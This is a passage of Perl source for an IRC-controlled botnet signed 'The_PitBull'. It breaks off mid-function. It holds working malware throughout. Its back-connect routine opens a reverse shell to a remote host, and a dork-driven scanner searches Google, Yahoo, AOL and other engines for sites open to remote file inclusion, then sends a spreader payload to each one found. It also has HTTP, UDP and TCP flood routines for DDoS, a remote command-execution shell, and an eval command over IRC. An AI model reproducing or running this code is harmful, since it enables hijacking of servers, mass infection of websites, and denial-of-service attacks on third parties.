\"socket: $!\";\nconnect(SOCKET, $paddr) or die \"connect: $!\";\nopen(STDIN, \">&SOCKET\");\nopen(STDOUT, \">&SOCKET\");\nopen(STDERR, \">&SOCKET\");\nsystem(\"$shell\");\nclose(STDIN);\nclose(STDOUT);\nclose(STDERR);\nif ($estatisticas)\n{\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003BackConnect\u0002\u000312] Connecting to \u00034 $host:$porta\");\n}\n}\n######################\n#End of  Back Connect# \n#                    #\n######################\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n######################\n#    EXTREME SCANNER # \n#                    #\n######################\n######################################################################\n#################### GOOGLE\n######################################################################\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n### Start Message\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] The [E]xtreme RFiScan is started for \u00034$dork\");\n### End of Start Message\n# Starting The Search Engine\n    my @google=&googlet($dork);\n#\npush(my @tot, @google);\n#\nmy @puliti=&unici(@tot);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u000312G\u00034o\u00038o\u000312g\u00039l\u00034e\u000312 Total:\u00034 \".scalar(@tot).\" \u000312Cleaned:\u00034 \".scalar(@puliti).\" \u000312for \u00032 $dork \");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %100==0){ \n}\nif ($contatore==$uni-1){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u000312G\u00034o\u00038o\u000312g\u00039l\u00034e\u000312 finished for\u00032 $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(5);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /DarkMindZ/ && $re =~ /uid=/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00034OFF\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\nelsif($re =~ /DarkMindZ/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00033ON\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\n}}}\nexit;\n}}\n\n######################################################################\n#################### AllTheWeb\n######################################################################\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n# Starting The Search Engine\n    my @alltheweb=&allthewebt($dork);\n    my @allweb=&standard($dork);\n#\npush(my @tot, @alltheweb, @allweb);\n#\nmy @puliti=&unici(@tot);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u00037A\u0003ll\u00037T\u0003he\u00037W\u0003eb\u000312 Total:\u00034 \".scalar(@tot).\" \u000312Cleaned:\u00034 \".scalar(@puliti).\" \u000312for \u00032 $dork \");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %100==0){ \n}\nif ($contatore==$uni-1){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u00037A\u0003ll\u00037T\u0003he\u00037W\u0003eb\u000312 finished for\u00032 $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(5);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /DarkMindZ/ && $re =~ /uid=/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00034OFF\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\nelsif($re =~ /DarkMindZ/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00033ON\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\n}}}\nexit;\n}}\n\n######################################################################\n#################### AOL\n######################################################################\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n# Starting The Search Engine\n    my @aollist=&aol($dork);\n    my @aollista=&aola($dork);\n    my @aollistb=&aolb($dork);\n    my @aollistc=&aolc($dork);\npush(my @aolbyp,@aollist, @aollista, @aollistb, @aollistc );\n#\npush(my @tot, @aolbyp);\nmy @puliti=&unici(@tot);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u00037AOL\u000312 Total:\u00034 \".scalar(@tot).\" \u000312Cleaned:\u00034 \".scalar(@puliti).\" \u000312for \u00032 $dork \");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %100==0){ \n}\nif ($contatore==$uni-1){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u00037AOL\u000312 finished for\u00032 $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(5);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /DarkMindZ/ && $re =~ /uid=/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00034OFF\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\nelsif($re =~ /DarkMindZ/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00033ON\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\n}}}\nexit;\n}}\n\n######################################################################\n#################### Yahoo\n######################################################################\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n# Starting The Search Engine\n    my @ylist=&yahoo($dork);\n    my @yalist=&yahooa($dork);\n    my @yblist=&yahoob($dork);\n    my @yclist=&yahooc($dork);\n    my @ydlist=&yahood($dork);\n        push(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist );    \n#\npush(my @tot, @yahoobypass);\nmy @puliti=&unici(@tot);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u000313Y\u00036ahoo\u00034!\u000312 Total:\u00034 \".scalar(@tot).\" \u000312Cleaned:\u00034 \".scalar(@puliti).\" \u000312for \u00032 $dork \");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %100==0){ \n}\nif ($contatore==$uni-1){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u000313Y\u00036ahoo\u00034!\u000312 finished for\u00032 $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(5);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /DarkMindZ/ && $re =~ /uid=/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00034OFF\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\nelsif($re =~ /DarkMindZ/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00033ON\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\n}}}\nexit;\n}}\n\n######################################################################\n#################### MSN\n######################################################################\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n# Starting The Search Engine\n    my @mlist=&msn($dork);\npush(my @tot, @mlist);\nmy @puliti=&unici(@tot);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u00037M\u00034S\u00037N\u000312 Total:\u00034 \".scalar(@tot).\" \u000312Cleaned:\u00034 \".scalar(@puliti).\" \u000312for \u00032 $dork \");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %100==0){ \n}\nif ($contatore==$uni-1){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u00037M\u00034S\u00037N\u000312 finished for\u00032 $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(5);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /DarkMindZ/ && $re =~ /uid=/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00034OFF\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\nelsif($re =~ /DarkMindZ/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00033ON\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\n}}}\nexit;\n}}\n\n######################################################################\n#################### ASK\n######################################################################\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n# Starting The Search Engine\n    my @asklist=&ask($dork);\npush(my @tot, @asklist);\nmy @puliti=&unici(@tot);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u000314A\u00034S\u000314K\u000312 Total:\u00034 \".scalar(@tot).\" \u000312Cleaned:\u00034 \".scalar(@puliti).\" \u000312for \u00032 $dork \");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %100==0){ \n}\nif ($contatore==$uni-1){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u000314A\u00034S\u000314K\u000312 finished for\u00032 $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(5);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /DarkMindZ/ && $re =~ /uid=/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00034OFF\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\nelsif($re =~ /DarkMindZ/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00033ON\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\n}}}\nexit;\n}}\n\n######################################################################\n#################### FireBall\n######################################################################\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n# Starting The Search Engine\n    my @fireball=fireball($dork);\npush(my @tot, @fireball);\nmy @puliti=&unici(@tot);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u00034F\u00031ire\u00034B\u00031all\u000312 Total:\u00034 \".scalar(@tot).\" \u000312Cleaned:\u00034 \".scalar(@puliti).\" \u000312for \u00032 $dork \");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %100==0){ \n}\nif ($contatore==$uni-1){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Scan\u0002\u000312] \u00034F\u00031ire\u00034B\u00031all\u000312 finished for\u00032 $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(5);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /DarkMindZ/ && $re =~ /uid=/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00034OFF\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\nelsif($re =~ /DarkMindZ/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003Vuln\u0002\u000312] \u00032(\u000312SafeMode:\u0002\u00033ON\u0002\u00032) \u00032(\u000312Site:\u00034 $print \u00032) \");\nmy $test2=\"http://\".$sito.$bug.$spread.\"?\";\nmy $reqz=HTTP::Request->new(GET=>$test2);\nmy $ua=LWP::UserAgent->new();\nmy $response=$ua->request($reqz);\n}}\n}}}\nexit;\n}}\n######################\n#End of EXTREMESCANNER# \n#                    #\n######################\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n######################\n#     HTTPFlood      # \n#                    #\n######################\nif ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003HTTP-DDOS\u0002\u000312] Attacking\u0003 \u00034 \".$1.\" \u000312 on port 80 for \u00034 \".$2.\" \u000312 seconds \u0003.\");\nmy $itime = time;\nmy ($cur_time);\n$cur_time = time - $itime;\nwhile ($2>$cur_time){\n$cur_time = time - $itime;\nmy $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);\nprint $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";\nclose($socket);\n}\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003HTTP-DDOS\u0002\u000312] Attacking done\u0003 \u00034 \".$1.\".\");\n}\n######################\n#  End of HTTPFlood  # \n#                    #\n######################\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n######################\n#     UDPFlood       # \n#                    #\n######################\nif ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003UDP-DDOS\u0002\u000312] Attacking \u00034 \".$1.\" \u000312 with \u00034 \".$2.\" \u000312 Kb Packets for \u00034 \".$3.\" \u000312 seconds.\u0003\");\nmy ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");\n$dtime = 1 if $dtime == 0;\nmy %bytes;\n$bytes{igmp} = $2 * $pacotes{igmp};\n$bytes{icmp} = $2 * $pacotes{icmp};\n$bytes{o} = $2 * $pacotes{o};\n$bytes{udp} = $2 * $pacotes{udp};\n$bytes{tcp} = $2 * $pacotes{tcp};\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u0003UDP-DDOS\u0002\u000312] \u000312Results\u00034 \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" \u000312Kb in\u00034 \".$dtime.\" \u000312seconds to\u00034 \".$1.\".\");\n}\nexit;\n}\n}\n######################\n#  End of Udpflood   # \n#                    #\n######################\n\n\nsub ircase {\nmy ($kem, $printl, $case) = @_;\n  if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   }\n   if ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\nif ($case =~ /^rejoin\\s+(.*)/) {\nmy $chan = $1;\nif ($chan =~ /^(\\d+) (.*)/) {\nfor (my $ca = 1; $ca <= $1; $ca++ ) {\np(\"$2\");\nj(\"$2\");\n}\n}\nelse {\np(\"$chan\");\nj(\"$chan\");\n}\n}\n\nif ($case =~ /^op/) {\nop(\"$printl\", \"$kem\") if $case eq \"op\";\nmy $oarg = substr($case, 3);\nop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n}\n\nif ($case =~ /^deop/) {\ndeop(\"$printl\", \"$kem\") if $case eq \"deop\";\nmy $oarg = substr($case, 5);\ndeop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n}\n\nif ($case =~ /^msg\\s+(\\S+) (.*)/) {\nmsg(\"$1\", \"$2\");\n}\n\nif ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\nfor (my $cf = 1; $cf <= $1; $cf++) {\nmsg(\"$2\", \"$3\");\n}\n}\n\nif ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\nctcp(\"$1\", \"$2\");\n}\n\nif ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\nfor (my $cf = 1; $cf <= $1; $cf++) {\nctcp(\"$2\", \"$3\");\n}\n}\n\nif ($case =~ /^nick (.*)/) {\nnick(\"$1\");\n}\n\nif ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {\nconectar(\"$2\", \"$1\", 6667);\n}\n\nif ($case =~ /^raw (.*)/) {\nsendraw(\"$1\");\n}\n\nif ($case =~ /^eval (.*)/) {\neval \"$1\";\n}\n}\n\n\nsub shell {\nmy $printl=$_[0];\nmy $comando=$_[1];\nif ($comando =~ /cd (.*)/) {\nchdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");\nreturn;\n}\n\nelsif ($pid = fork) {\nwaitpid($pid, 0);\n}\nelse {\nif (fork) {\nexit;\n\n} else {\nmy @resp=`$comando 2>&1 3>&1`;\nmy $c=0;\nforeach my $linha (@resp) {\n  $c++;\n  chop $linha;\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n  if ($c == \"$linas_max\") {\n    $c=0;\n    sleep $sleep;\n  }\n}\nexit;\n}\n}\n}\n\nsub tcpflooder {\nmy $itime = time;\nmy ($cur_time);\nmy ($ia,$pa,$proto,$j,$l,$t);\n$ia=inet_aton($_[0]);\n$pa=sockaddr_in($_[1],$ia);\n$ftime=$_[2];\n$proto=getprotobyname('tcp');\n$j=0;$l=0;\n$cur_time = time - $itime;\nwhile ($l<1000){\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\n$t=\"SOCK$l\";\nsocket($t,PF_INET,SOCK_STREAM,$proto);\nconnect($t,$pa)||$j--;\n$j++;$l++;\n}\n$l=0;\nwhile ($l<1000){\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\n$t=\"SOCK$l\";\nshutdown($t,2);\n$l++;\n}\n}\n\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n# % The_PitBull Pwned your BoX  %\n# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%\n\nsub udpflooder {\nmy $iaddr = inet_aton($_[0]);\nmy $msg = 'A' x $_[1];\nmy $ftime = $_[2];\nmy $cp = 0;\nmy (%pacotes);\n$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\nsocket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\nsocket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\nsocket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\nsocket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\nreturn(undef) if $cp == 4;\nmy $itime = time;\nmy ($cur_time);\nwhile ( 1 ) {\nfor (my $porta = 1;\n$porta <= 65000; $porta++) {\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\nsend(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;\nsend(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;\nsend(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;\nsend(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;\n\n\nfor (my $pc = 3;\n$pc <= 255;$pc++) {\nnext if $pc == 6;\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\nsocket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\nsend(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;\n}\n}\nlast if $cur_time >= $ftime;\n}\nreturn($cur_time, %pacotes);\n}\n\nsub ctcp {\nreturn unless $#_ == 1;\nsendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\n\nsub msg {\nreturn unless $#_ == 1;\nsendraw(\"PRIVMSG $_[0] :$_[1]\");\n}\n\nsub notice {\nreturn unless $#_ == 1;\nsendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\nreturn unless $#_ == 1;\nsendraw(\"MODE $_[0] +o $_[1]\");\n}\n\nsub deop {\nreturn unless $#_ == 1;\nsendraw(\"MODE $_[0] -o $_[1]\");\n}\n\nsub j {\n&join(@_);\n}\n\nsub join {\nreturn unless $#_ == 0;\nsendraw(\"JOIN $_[0]\");\n\n}\nsub p { part(@_);\n}\n\nsub part {\nsendraw(\"PART $_[0]\");\n}\n\nsub nick {\nreturn unless $#_ == 0;\nsendraw(\"NICK $_[0]\");\n}\n\nsub quit {\nsendraw(\"QUIT :$_[0]\");\n}\n\n#####\n# SUBS GOOGLE\n#####\nsub googlet {\nmy @dominios = (\"com\",\"net\",\"org\",\"info\",\"gov\", \"gob\",\"gub\",\"xxx\", 